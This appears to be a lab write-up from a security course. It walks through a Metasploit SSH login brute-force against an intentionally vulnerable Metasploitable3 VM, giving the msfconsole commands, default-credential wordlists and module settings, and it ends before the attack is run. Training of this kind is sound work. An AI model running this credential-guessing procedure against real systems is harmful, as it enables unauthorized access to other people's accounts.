
#  Task 1.1 – Use Kali Linux tool Metasploit to compromise the service.

## 🎯 Objective
Compromise the SSH service of Metasploitable3 from Kali Linux using Metasploit and gain unauthorized access.

---

## 🖥️ Environment Setup

| Machine            | IP Address      | Role         |
|--------------------|------------------|--------------|
| Kali Linux         | 192.168.64.2       | Attacker     |
| Metasploitable3    | 192.168.64.3       | Victim       |

---

## 🛠 Tools Used

- **Kali Linux** – Attack platform
- **Metasploit Framework** – Exploitation tool
- **Metasploitable3** – Vulnerable target machine

---

## 🔍 Steps Performed

### ✅ Step 1: Start Metasploit
Open a terminal in Kali Linux and type:

```bash
msfconsole
```
![image](https://github.com/user-attachments/assets/89f65339-e9ae-4a6b-a180-ca4823099e36)

### ✅ Step 2: Select the SSH Login Scanner Module

Open Metasploit and type the following to use the SSH login scanner:

```bash
use auxiliary/scanner/ssh/ssh_login
```
![image](https://github.com/user-attachments/assets/1eb9ce2e-b5bb-4164-afc7-91143314862a)

### ✅ Step 3: Create Custom Wordlists
``` bash
echo -e "root\nmsfadmin\nuser\nadmin" > /home/kali/ssh-brute/users.txt
echo -e "root\nmsfadmin\ntoor\n123456" > /home/kali/ssh-brute/pass.txt
```
![image](https://github.com/user-attachments/assets/d6bfa9ac-cb05-4813-baf5-842f220a482b)

### ✅ Step 4: Edit the Wordlists Using Nano

After creating the wordlists, open them with `nano` to make sure they contain the correct entries.

#### 📝 Edit the usernames file:

```bash
nano /home/kali/ssh-brute/users.txt
```
#### 📝 Edit the passwords file:

```bash
nano /home/kali/ssh-brute/pass.txt
```
![image](https://github.com/user-attachments/assets/788a74c3-bd32-4962-96d5-deeebf3f7127)

#### content of the users file:
![image](https://github.com/user-attachments/assets/8fedfad2-2381-44a7-8135-0c8f93f2ddb8)


#### content of the passwords file:
![image](https://github.com/user-attachments/assets/ce6f742d-8ca9-4f4c-9dda-ab4404fe97c8)

### ✅ Step 5: Configure the Metasploit Module

Now that the wordlists are ready, configure Metasploit with the correct options:

```bash
set RHOSTS 192.168.64.3
set USER_FILE /home/kali/ssh-brute/users.txt
set PASS_FILE /home/kali/ssh-brute/pass.txt
set BRUTEFORCE_SPEED 5
set THREADS 4
set VERBOSE true
```
![image](https://github.com/user-attachments/assets/e37da72a-ba23-410a-b272-a7eb443162df)
🔍 **Explanation of each setting:**

- `RHOSTS`: The IP address of the target machine (Metasploitable3)
- `USER_FILE`: Path to the file that contains the list of usernames
- `PASS_FILE`: Path to the file that contains the list of passwords
- `BRUTEFORCE_SPEED`: Controls how fast the attack runs (1 = slow, 5 = fast)
- `THREADS`: Number of parallel login attempts to speed up the scan
- `VERBOSE`: Shows the result of every login attempt in the terminal

